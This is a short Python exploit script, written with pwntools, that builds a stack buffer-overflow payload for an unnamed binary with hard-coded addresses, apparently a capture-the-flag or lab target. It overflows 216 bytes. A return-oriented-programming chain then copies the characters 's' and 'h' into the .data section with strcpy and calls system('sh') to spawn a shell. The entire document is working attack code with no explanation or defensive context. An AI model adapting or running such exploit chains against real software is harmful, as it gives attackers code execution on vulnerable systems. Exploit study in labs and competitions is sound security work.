import sys
from pwn import *

s_address = 0x400476
h_address = 0x401034
write_to = 0x404038
system = 0x401084
strcpy = 0x401074
ret = 0x40101a
pop_rdi_ret = 0x4012c3
pop_rsi_pop_r15_ret = 0x4012c1
dummy = b'C' * 8

buf = b'A' * 208
buf += b'\x42' * 8

# Copy 's' to .data section
rop  = p64(ret)
rop += p64(pop_rdi_ret)
rop += p64(write_to)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(s_address)
rop += dummy
rop += p64(strcpy)

# Copy 'h' to .data section
rop += p64(pop_rdi_ret)
rop += p64(write_to + 0x1)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(h_address)
rop += dummy
rop += p64(strcpy)

# Call system with 'sh' as parameter
rop += p64(pop_rdi_ret)
rop += p64(write_to)
rop += p64(system)

buf += rop

sys.stdout.buffer.write(buf)